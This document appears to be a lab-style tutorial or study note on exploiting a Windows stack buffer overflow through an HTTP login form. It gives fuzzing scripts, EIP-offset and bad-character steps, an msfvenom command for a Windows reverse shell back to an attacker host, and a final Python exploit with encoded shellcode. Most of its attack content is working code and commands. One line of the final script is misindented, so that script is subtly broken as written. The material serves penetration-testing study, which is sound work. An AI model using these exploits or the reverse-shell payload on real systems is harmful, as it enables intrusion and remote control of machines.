## Fuzzing the HTTP Protocol

### Creating the Crash

1. Begin fuzzing every input field the application offered looking for unexpected behavior or an application crash.
2. Gather data to determine the behavior of the application
   1. Take packet captures using tcpdump/wireshark
3. Create a proof of concept code to try to exploit the vulnerability
4. Attach a debugger to the program to catch any violations that occur
   1. To find the process, we can try to use immunity debugger's 'Attach' dialogue to see the listening ports.  
   2. If it doesn't show up there, you can use Windows TCP View to find it.
   3. You may need to run Immunity as Admin to access the process.
   4. Attaching a debugger to an app pauses it, so remember to resume it.
5. Once you find a crash, note the conditions and attempt to replicate the crash

```python
# Finding the number to crash it:
#!/usr/bin/python
import socket
import time
import sys
size = 100
while(size < 2000):
    try:
        print "\nSending evil buffer with %s bytes" % size
        inputBuffer = "A" * size
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.216.10\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.216.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.216.10", 80))
        s.send(buffer)
        s.close()
        size += 100
        time.sleep(4)
    except:
        print "\nCould not connect!"
        sys.exit()
```

```python
# Replicating the crash, when finding how many bytes crashed it
#!/usr/bin/python
import socket
try:        
        print "\nSending evil buffer..."

        size = 800

        inputBuffer = "A" * size

        content = "username=" + inputBuffer + "&password=A"

        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.216.10\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.216.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"

        buffer += content

        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        
        s.connect(("192.168.216.10", 80))
        s.send(buffer)
        
        s.close()
        print "\Done!"
except:
        print "\nCould not connect!"
```

### Control EIP

Work to control EIP - Figure out exactly which part of the buffer is landing in the EIP.  Two methods:
1. Binary Tree Analysis (Inefficient method)
   1. Split the buffer halfway between A's and B's
   2. Divide whichever portion it lands in again.  Ex. if it lands in the second half (B's), divide that section into half B's and half C's.
   3. Continue splitting until you find the exact bytes to overwrite EIP
   4. This takes about 7 iterations
2. Use a non-repeating string as a more efficient method.  Just look for that unique sequence to find where in the input buffer it is located.
   1. Use Metasploit's pattern creation tool in Kali
      `msf-pattern_create -l LENGTH`
   2. EIP will report the value as the hexadecimal representation of the string of characters
   3. Use msf-pattern again to find that subset in your main string, it will return how many characters your filler needs to be before the EIP:
      `msf-pattern_offset -l LENGTH -q HEX#_FROM_EIP`

```python
# Using non-repeating string to find EIP
#!/usr/bin/python
import socket

try:        
    print "\nSending evil buffer....."

    inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.216.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.216.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        
    s.connect(("192.168.216.10", 80))
    s.send(buffer)
        
    s.close()
    print "\Done!"
except:
    print "\nCould not connect!"
```

```python
# Exhibiting EIP control
#!/usr/bin/python
import socket

try:        
    print "\nSending evil buffer....."

    filler = "A" * 780
    eip  = "B" * 4
    ending = "C" * 16
    inputBuffer = filler + eip + ending

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.216.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.216.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        
    s.connect(("192.168.216.10", 80))
    s.send(buffer)
        
    s.close()
    print "\Done!"
except:
    print "\nCould not connect!"
```

### Exploiting the Overflow

#### Fill Space between EIP and ESP

1. Look to see where ESP is pointing to at crash time and compare it to where EIP points.  Add enough characters to the input to fill in the space between the two such that your shellcode falls exactly where ESP points.

#### Locate space for Shellcode

1. Shellcode requires approximately 350-400 bytes of space.
3. Create buffer space for the code at the end of the input buffer to create space for the shellcode.  Good idea is to make the total input buffer 1500 chars, so in your program, make the buffer space 1500 - the code used to produce the overflow
   ex:`codebuffer = "D" * (1500 -len(filler) - len(eip) - len(offset)) `

```python
# Testing buffer space
#!/usr/bin/python
import socket

try:        
    print "\nSending evil buffer....."

    filler = "A" * 780
    eip  = "B" * 4
    offset = "C" * 4	# Distance from EIP to ESP
    codebuffer = "D" * (1500 -len(filler) - len(eip) - len(offset))
    inputBuffer = filler + eip + offset + codebuffer

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.216.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.216.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        
    s.connect(("192.168.216.10", 80))
    s.send(buffer)
        
    s.close()
    print "\Done!"
except:
    print "\nCould not connect!"
```

#### Redirecting Execution Flow

We need to set the EIP register to the address where our shellcode will be found (Where the ESP register points).  But this address changes from run to run, but it is always the same offset.

One solution is the `JMP ESP` instruction, which jumps to the address pointed to by ESP when it executes.  We can reference a `JMP ESP` command in the code as it is a commonly used instruction set but it must meet some criteria:

1. The addresses used in the library must be static, which eliminates libraries with ASLR support.
2. The address must not contain any of the bad characters that will break the exploit.

##### Looking for JMP ESP

1. To find eligible code, use the mona python script in Immunity to request info about all DLL's loaded by the process into memory space:
   `!mona modules`
   This will show which DLL's have memory protection as well as their base address range.  Remember the address cannot contain any bad characters.

2. Once a DLL is identified, use mona to search for the hex representation of `JMP ESP`

   1. You can find the hex representation of any command using Metasploit:

      ```bash
      #Ex: 
      msf-nasm_shell
      nasm > jmp esp
      # outputs 0000000  FFE4              jmp esp
      ```

3. Use Mona to search the DLL for this opcode, using the escape character format for the opcode (`\x` in front of each hex number)

   ```bash
   # Ex:
   !mona find -s "\xff\xe4" -m "libspp.dll"
   ```

4. If a result is found, you can highlight it and hit Enter to go to that address in the disassembler or use the "Go to address in disassembler" button ![image-20200704164547700](.FuzzingWin32.assets/image-20200704164547700.png) and enter the address it found.  Here you can verify it does indeed contain the instruction JMP ESP.

5. In the exploit code, set the EIP value to this address with the hex digits IN REVERSE (due to Intel's 'little endian' architecture).  So if the address is 0x10090c83, then the value of EIP should be: `\x83\x0c\x09\x10`, with escape characters included.

6. Once executed, EIP will be set to the ESP value, which will cause EIP to execute our shellcode, once we have it in place.

NOTE: It's a good idea to set a breakpoint at your JMP ESP and step through it to make sure things are working as expected.

#### Discover bad characters

Common bad characters:  0x00 (NULL)

Bad for HTTP:  0x0A (Line Feed), 0x0D (End Character), 0x25 (%), 0x26 (&), 0x2B (+), 0x3D (=)

One way to check is send all possible characters from 0x00 to 0xFF:


```python
# Checking for bad characters
#!/usr/bin/python 
import socket
                            
try:              
    print "\nSending evil buffer....."
    filler = "A" * 780
    eip  = "B" * 4
    offset = "C" * 4
    badchars = (
            "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
    inputBuffer = filler + eip + offset + badchars

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.216.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.216.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        
    s.connect(("192.168.216.10", 80))
    s.send(buffer)
        
    s.close()
    print "\Done!"
except:
    print "\nCould not connect!"
```

When the program crashes, right click ESP and 'Follow in stack' then look at where/if the bad characters stopped.  If it stops at 0x09, we know 0x0A is a bad character.

#### Generating Shellcode

Metasploit makes generating complex payloads very easily.  MSF Venom also allows you to encode payloads in different formats.  

```bash
# Example this creates a reverse netcat-like shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -v VARIABLE

# Options
LHOST	# This is the attacker's machine, the local host
LPORT	# Port the attacker's machine is listening on
EXITFUNC=thread # Tells the exploit to terminate the thread and not the whole process
-f python	# Python formatted shellcode, output as bytes
-e 		# Chooses a different encoding engine
-b		# Specifies a list of bad characters to avoid
-v VARIABLE	# Name of variable to use in code
```

##### EXITFUNC

The default exit for shellcode generated with MSFVenom is ExitProcess, which terminates the entire process when the reverse shell is terminated.  For threaded applications, you can try to use ExitThread instead to terminate the single thread without killing the whole application.  This is the purpose of the `EXITFUNC=thread ` parameter with MSF Venom.

#### Overcoming Issues

##### NOP Sleds

An encoder process is stubbed at the beginning of any encoded shell code and is run to decode the shellcode in memory.  The GetPC part of this process moves the value of the EIP register into another register which writes to the top of the stack and mangles some of the bytes pointed to by the ESP register, which overwrites our return address and causes an access violation.

Two solutions:

1. Adjust ESP backwards before executing the decoder (complicated)
2. Create a NOP sled to increase the size of the landing pad.  NOP commands just bump it to the next command, so overwriting one doesn't harm the program.

NOP has a hex opcode of 0x90.  The magic number of NOPs to pad is 12-10.

##### Options for Limited Room At End

##### Moving ESP

Another way to overcome the encoder issue is by moving ESP.  This is also useful to know if you need to insert your shellcode in a location other than where ESP points, such as when you don't have enough room after EIP.  To move ESP, use the `sub esp,0x??` command.  You can translate this to opcode using Metasploit.  Always be sure to move ESP in amounts divisible by 4 (in decimal).  

Also remember, you can move it more than once.

```bash
/usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
sub esp,0x10
# Outputs "\x83\xec\x10"
```

##### JMP ECX

You can also jump to other registers beside EIP if it fits your purpose.

### Final Code Example

```python
#!/usr/bin/python                                                                                                 
import socket       

try:                 
    print "\nSending evil buffer....."
                                                                                                                  
    filler = "A" * 780
    eip  = "\x83\x0c\x09\x10"        
    offset = "C" * 4
    nops = "\x90" * 10
    shellcode = ("\xda\xc4\xbe\xe5\x02\x9a\x99\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
            "\x52\x31\x73\x17\x03\x73\x17\x83\x0e\xfe\x78\x6c\x2c\x17\xfe"
            "\x8f\xcc\xe8\x9f\x06\x29\xd9\x9f\x7d\x3a\x4a\x10\xf5\x6e\x67"
            "\xdb\x5b\x9a\xfc\xa9\x73\xad\xb5\x04\xa2\x80\x46\x34\x96\x83"
            "\xc4\x47\xcb\x63\xf4\x87\x1e\x62\x31\xf5\xd3\x36\xea\x71\x41"
            "\xa6\x9f\xcc\x5a\x4d\xd3\xc1\xda\xb2\xa4\xe0\xcb\x65\xbe\xba"
            "\xcb\x84\x13\xb7\x45\x9e\x70\xf2\x1c\x15\x42\x88\x9e\xff\x9a"
            "\x71\x0c\x3e\x13\x80\x4c\x07\x94\x7b\x3b\x71\xe6\x06\x3c\x46"
            "\x94\xdc\xc9\x5c\x3e\x96\x6a\xb8\xbe\x7b\xec\x4b\xcc\x30\x7a"
            "\x13\xd1\xc7\xaf\x28\xed\x4c\x4e\xfe\x67\x16\x75\xda\x2c\xcc"
            "\x14\x7b\x89\xa3\x29\x9b\x72\x1b\x8c\xd0\x9f\x48\xbd\xbb\xf7"
            "\xbd\x8c\x43\x08\xaa\x87\x30\x3a\x75\x3c\xde\x76\xfe\x9a\x19"
            "\x78\xd5\x5b\xb5\x87\xd6\x9b\x9c\x43\x82\xcb\xb6\x62\xab\x87"
            "\x46\x8a\x7e\x07\x16\x24\xd1\xe8\xc6\x84\x81\x80\x0c\x0b\xfd"
            "\xb1\x2f\xc1\x96\x58\xca\x82\x58\x34\xa3\x8a\x31\x47\x4b\x34"
            "\x82\xce\xad\x20\x12\x87\x66\xdd\x8b\x82\xfc\x7c\x53\x19\x79"
            "\xbe\xdf\xae\x7e\x71\x28\xda\x6c\xe6\xd8\x91\xce\xa1\xe7\x0f"
            "\x66\x2d\x75\xd4\x76\x38\x66\x43\x21\x6d\x58\x9a\xa7\x83\xc3"
            "\x34\xd5\x59\x95\x7f\x5d\x86\x66\x81\x5c\x4b\xd2\xa5\x4e\x95"
            "\xdb\xe1\x3a\x49\x8a\xbf\x94\x2f\x64\x0e\x4e\xe6\xdb\xd8\x06"
            "\x7f\x10\xdb\x50\x80\x7d\xad\xbc\x31\x28\xe8\xc3\xfe\xbc\xfc"
            "\xbc\xe2\x5c\x02\x17\xa7\x7d\xe1\xbd\xd2\x15\xbc\x54\x5f\x78"
            "\x3f\x83\x9c\x85\xbc\x21\x5d\x72\xdc\x40\x58\x3e\x5a\xb9\x10"
            "\x2f\x0f\xbd\x87\x50\x1a")


    inputBuffer = filler + eip + offset + nops + shellcode

    content = "username=" + inputBuffer + "&password=A"

        buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.216.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.216.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n" 
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
         
    s.connect(("192.168.216.10", 80))
    s.send(buffer)
         
    s.close()
    print "\Done!"
except:
    print "\nCould not connect!"
```
